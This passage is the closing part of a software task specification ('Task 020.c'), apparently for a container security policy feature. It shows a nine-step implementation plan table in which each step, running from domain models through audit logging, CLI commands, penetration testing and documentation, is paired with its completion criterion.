| 1 | Implement domain models | Unit tests pass |
| 2 | Implement policy builders | Builder tests pass |
| 3 | Implement policy enforcer | Enforcer tests pass |
| 4 | Implement policy validator | Validation tests pass |
| 5 | Integrate with ContainerLifecycleManager | Integration tests pass |
| 6 | Implement audit logging | Audit tests pass |
| 7 | Add CLI commands | E2E tests pass |
| 8 | Security validation | Penetration testing |
| 9 | Documentation and release | User manual complete |

---

**End of Task 020.c Specification**